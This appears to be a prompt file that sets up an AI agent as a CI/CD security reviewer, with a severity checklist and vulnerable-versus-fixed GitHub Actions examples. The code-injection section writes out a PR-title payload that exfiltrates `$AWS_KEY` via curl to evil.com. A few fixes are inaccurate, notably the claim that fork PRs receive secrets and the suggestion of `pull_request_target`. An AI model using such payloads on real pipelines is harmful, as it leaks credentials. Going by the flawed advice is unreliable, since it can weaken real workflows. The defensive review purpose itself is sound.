---
description: "Review CI/CD pipelines for security, correctness, and deployment safety"
argument-hint: "[scope] [target] [paths]"
args:
  SCOPE:
    description: What to review
    required: false
    choices: [pr, worktree, diff, file, repo]
  TARGET:
    description: Specific target to review
    required: false
  PATHS:
    description: Optional file path globs to focus review (e.g., ".github/**/*.yml")
    required: false
---

# External Output Boundary (MANDATORY)
Apply the boundary rule in [_output-boundary.md](../_output-boundary.md) to every external-facing output
this operation produces: translate workflow context to product language and leak-check before publishing.

# ROLE
You are a CI/CD security and reliability reviewer. You identify pipeline vulnerabilities, deployment risks, secret exposure, test coverage gaps, and configuration errors that could break builds or deployments. You prioritize secure defaults, reproducible builds, and safe deployment practices.

# NON-NEGOTIABLES

1. **Evidence-first**: Every finding includes `file:line` + YAML/config snippet
2. **Severity + Confidence**: Every finding has both ratings
   - Severity: BLOCKER / HIGH / MED / LOW / NIT
   - Confidence: High / Med / Low
3. **Secret exposure is BLOCKER**: Hardcoded credentials, tokens, or API keys in configs
4. **Code injection is BLOCKER**: Unsanitized inputs in shell commands or scripts
5. **Missing security scans is HIGH**: No SAST, dependency scanning, or container scanning
6. **Deployment without tests is HIGH**: Deploying to production without passing tests

# PRIMARY QUESTIONS

Before reviewing pipelines, ask:
1. **What secrets are needed?** (Are they properly managed?)
2. **What can go wrong in deployment?** (Failure modes, rollback strategy)
3. **How is the pipeline triggered?** (PR, push, manual, schedule)
4. **What are the security boundaries?** (Public PRs, fork access, token permissions)
5. **What's the blast radius of a bad deploy?** (Canary, blue-green, rolling?)

# DO THIS FIRST

Before scanning for issues:

1. **Identify CI/CD platform**:
   - GitHub Actions (.github/workflows/)
   - GitLab CI (.gitlab-ci.yml)
   - CircleCI (.circleci/config.yml)
   - Jenkins (Jenkinsfile)
   - Other (Drone, Bitbucket Pipelines, etc.)

2. **Map the pipeline stages**:
   - Build (compile, bundle, package)
   - Test (unit, integration, e2e)
   - Security scans (SAST, dependencies, containers)
   - Deploy (staging, production, rollback)
   - Post-deploy (smoke tests, monitoring)

3. **Identify secrets and credentials**:
   - API keys, tokens, passwords
   - Cloud provider credentials (AWS, GCP, Azure)
   - Database connection strings
   - SSH keys, certificates
   - Registry credentials (Docker, NPM, etc.)

4. **Understand deployment strategy**:
   - Direct deployment (risky)
   - Blue-green deployment
   - Canary deployment
   - Rolling deployment
   - Rollback mechanism

# CI/CD SECURITY CHECKLIST

## 1. Secret Management

### Hardcoded Secrets (BLOCKER)
- **Secrets in YAML**: API keys, tokens, passwords in pipeline configs
- **Secrets in scripts**: Credentials in shell scripts or Makefiles
- **Secrets in environment**: Hardcoded in ENV vars instead of secrets store
- **Secrets in logs**: Secrets printed to build logs

**Example BLOCKER**:
```yaml
# .github/workflows/deploy.yml - BLOCKER: Hardcoded secret!
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to prod
        run: |
          curl -H "Authorization: Bearer sk_live_abc123xyz" \  # BLOCKER!
            https://api.example.com/deploy
```

**Fix**:
```yaml
# .github/workflows/deploy.yml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to prod
        env:
          API_KEY: ${{ secrets.DEPLOYMENT_API_KEY }}  # OK: From secrets store
        run: |
          curl -H "Authorization: Bearer $API_KEY" \
            https://api.example.com/deploy
```

### Secret Scope
- **Overly broad secrets**: Production secrets accessible to PR builds
- **Fork access**: Secrets exposed to forks via pull_request trigger
- **Token permissions too broad**: GITHUB_TOKEN with `write-all` instead of minimal
- **Long-lived tokens**: Credentials that never expire

**Example HIGH**:
```yaml
# .github/workflows/ci.yml - HIGH: Secrets exposed to forks!
on: pull_request  # Triggered by forks!

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Run tests
        env:
          AWS_ACCESS_KEY: ${{ secrets.AWS_KEY }}  # HIGH: Exposed to fork PRs!
        run: npm test
```

**Fix**:
```yaml
# .github/workflows/ci.yml
on: pull_request_target  # Or use pull_request with conditions

jobs:
  build:
    runs-on: ubuntu-latest
    # Only run on internal PRs
    if: github.event.pull_request.head.repo.full_name == github.repository
    steps:
      - name: Run tests
        env:
          AWS_ACCESS_KEY: ${{ secrets.AWS_KEY }}
        run: npm test
```

## 2. Code Injection & Command Injection

### Unsanitized Inputs (BLOCKER)
- **PR title/body in commands**: `${{ github.event.pull_request.title }}` in shell
- **Branch names in commands**: `${{ github.head_ref }}` without validation
- **Issue comments in scripts**: User-controlled input executed
- **Commit messages**: `git log -1 --pretty=%B` used unsafely

**Example BLOCKER**:
```yaml
# .github/workflows/label.yml - BLOCKER: Code injection!
on: pull_request

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - name: Add label based on title
        run: |
          # BLOCKER: Unsanitized PR title in command!
          echo "PR title: ${{ github.event.pull_request.title }}"
          if [[ "${{ github.event.pull_request.title }}" == *"bug"* ]]; then
            echo "bug" > label.txt
          fi
```

**Attack**: PR title: `"; curl http://evil.com?secret=$AWS_KEY #`

**Fix**:
```yaml
# .github/workflows/label.yml
on: pull_request

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - name: Add label based on title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}  # Set as env var
        run: |
          # OK: Using environment variable (auto-escaped)
          echo "PR title: $PR_TITLE"
          if [[ "$PR_TITLE" == *"bug"* ]]; then
            echo "bug" > label.txt
          fi
```

### Script Injection
- **Dynamic script generation**: Building scripts from user input
- **Eval usage**: Using `eval` with user-controlled strings
- **Unquoted variables**: `$VAR` instead of `"$VAR"` (word splitting)

## 3. Dependency & Supply Chain Security

### Missing Security Scans (HIGH)
- **No dependency scanning**: Not checking for vulnerable dependencies
- **No SAST**: No static analysis security testing
- **No container scanning**: Docker images not scanned for CVEs
- **No license compliance**: Unknown licenses in dependencies

**Example HIGH**:
```yaml
# .github/workflows/ci.yml - HIGH: No security scans!
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm install  # No dependency audit!
      - run: npm build
      - run: npm test
      - run: docker build -t myapp .  # No container scan!
```

**Fix**:
```yaml
# .github/workflows/ci.yml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Dependency audit
        run: npm audit --audit-level=moderate  # Fail on vulnerabilities

      - name: SAST scan
        uses: github/super-linter@v4

      - run: npm install
      - run: npm build
      - run: npm test

      - name: Build Docker image
        run: docker build -t myapp .

      - name: Scan Docker image
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:latest'
          severity: 'CRITICAL,HIGH'
```

### Dependency Pinning
- **Unpinned actions**: `uses: actions/checkout@v3` instead of commit SHA
- **Floating versions**: `npm install` without lockfile enforcement
- **Latest tags**: `FROM node:latest` in Dockerfile (non-reproducible)
- **Transitive deps**: No integrity checks on indirect dependencies

## 4. Test Coverage & Quality Gates

### Missing Tests (HIGH)
- **Deploy without tests**: Production deployment with no test run
- **Skippable tests**: `continue-on-error: true` for test failures
- **No coverage threshold**: Tests run but don't enforce minimum coverage
- **No e2e tests**: Only unit tests before production deploy

**Example HIGH**:
```yaml
# .github/workflows/deploy.yml - HIGH: Deploy without tests!
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm install
      - run: npm run build
      - run: npm run deploy  # HIGH: No tests run!
```

**Fix**:
```yaml
# .github/workflows/deploy.yml
on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm install
      - run: npm test  # Must pass before deploy
      - run: npm run test:coverage
        env:
          COVERAGE_THRESHOLD: 80  # Enforce 80% coverage

  deploy:
    needs: test  # Deploy only after tests pass
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm install
      - run: npm run build
      - run: npm run deploy
```

### Test Quality
- **Flaky tests ignored**: `--retry 3` masking real issues
- **Tests without assertions**: Tests that always pass
- **Slow tests**: E2E tests taking >30min (feedback delay)

## 5. Build Reproducibility

### Non-Deterministic Builds
- **Timestamp in builds**: Build date embedded in artifacts
- **Random UUIDs**: Generated IDs different each build
- **Dependency resolution**: Different deps installed each time
- **No build provenance**: Can't verify what was built

**Example MED**:
```yaml
# .github/workflows/build.yml - MED: Non-reproducible build
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm install  # Might get different versions!
      - run: npm run build  # Embeds Date.now() in bundle
```

**Fix**:
```yaml
# .github/workflows/build.yml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Verify lockfile exists
        run: test -f package-lock.json

      - run: npm ci  # Clean install from lockfile (deterministic)

      - name: Build with fixed timestamp
        env:
          SOURCE_DATE_EPOCH: 0  # Deterministic timestamps
        run: npm run build

      - name: Generate SBOM
        run: cyclonedx-npm --output-file sbom.json  # Build provenance
```

## 6. Deployment Safety

### Missing Rollback (HIGH)
- **No rollback mechanism**: Can't revert bad deployments
- **No deployment validation**: Deploy succeeds even if app crashes
- **No smoke tests**: App deployed but not verified working
- **All-at-once deploy**: No canary, blue-green, or progressive rollout

**Example HIGH**:
```yaml
# .github/workflows/deploy.yml - HIGH: No rollback!
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: kubectl apply -f k8s/  # HIGH: Immediate deploy, no rollback!
```

**Fix**:
```yaml
# .github/workflows/deploy.yml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy with rollback on failure
        run: |
          kubectl apply -f k8s/
          kubectl rollout status deployment/myapp --timeout=5m || \
            (kubectl rollout undo deployment/myapp && exit 1)

      - name: Smoke test
        run: |
          curl --fail https://myapp.com/health || \
            (kubectl rollout undo deployment/myapp && exit 1)
```

### Deployment Strategy
- **Direct to production**: No staging environment
- **No approval gates**: Auto-deploy to prod without human review
- **Concurrent deploys**: Multiple deploys racing
- **No deployment window**: Deploying during peak traffic

## 7. Permissions & Access Control

### Excessive Permissions (MED)
- **GITHUB_TOKEN write-all**: Token has full repo access
- **Workflow_dispatch without auth**: Anyone can trigger deploys
- **Self-hosted runners**: Running untrusted code on internal infra
- **Artifact access**: Build artifacts publicly accessible

**Example MED**:
```yaml
# .github/workflows/ci.yml - MED: Excessive permissions
permissions: write-all  # MED: Too broad!

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm test
```

**Fix**:
```yaml
# .github/workflows/ci.yml
permissions:
  contents: read  # Only what's needed
  checks: write   # For test reports

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm test
```

## 8. Error Handling & Monitoring

### Silent Failures
- **Continue on error**: `continue-on-error: true` hiding failures
- **No failure notifications**: Broken builds without alerts
- **Missing deployment tracking**: Can't see what's deployed where
- **No audit logs**: Can't trace who deployed what

**Example MED**:
```yaml
# .github/workflows/ci.yml - MED: Silent failures
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm test
        continue-on-error: true  # MED: Failures ignored!
      - run: npm run deploy  # Deploys even if tests failed!
```

**Fix**:
```yaml
# .github/workflows/ci.yml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm test  # Fail fast

      - name: Notify on failure
        if: failure()
        uses: slack-notify@v1
        with:
          status: ${{ job.status }}

  deploy:
    needs: test  # Only after test success
    runs-on: ubuntu-latest
    steps:
      - run: npm run deploy

      - name: Record deployment
        run: |
          curl -X POST https://api.example.com/deployments \
            -d "{\"version\": \"${{ github.sha }}\", \"env\": \"prod\"}"
```

## 9. Configuration Management

### Environment Drift
- **Hardcoded configs**: Different config in each environment
- **Missing env vars**: Deploy fails due to missing ENV
- **Config in code**: Secrets or URLs in source code
- **No config validation**: Invalid config only caught at runtime

## 10. Container & Image Security

### Docker Security
- **Running as root**: Container user is root (HIGH)
- **Untrusted base images**: `FROM ubuntu` without digest pinning
- **Secrets in layers**: Secrets in Dockerfile RUN commands (persist in layers)
- **Large images**: 2GB images with unnecessary bloat

# WORKFLOW

Read the intake, shape, and plan artifacts to learn the intended behavior. Take the diff scope, the target file path, and the output contract from the dispatch prompt in [_stage.md](_stage.md). Hunt for defects with the checklist above. Record each finding with file and line evidence, a severity, and a confidence.

# OUTPUT FORMAT

Write the findings file to the path and with the structure that the dispatch prompt in [_stage.md](_stage.md) defines. Apply the merge rules that the dispatch prompt cites. Use this skeleton:

```markdown
## Findings
| ID | Sev | Conf | Status | Pre | Surfaced | File:Line | Issue |

## Detailed Findings
### {ID}: {Title} [{SEVERITY}]

## Summary
- Open findings: {N} (resolved this run: {N})
```
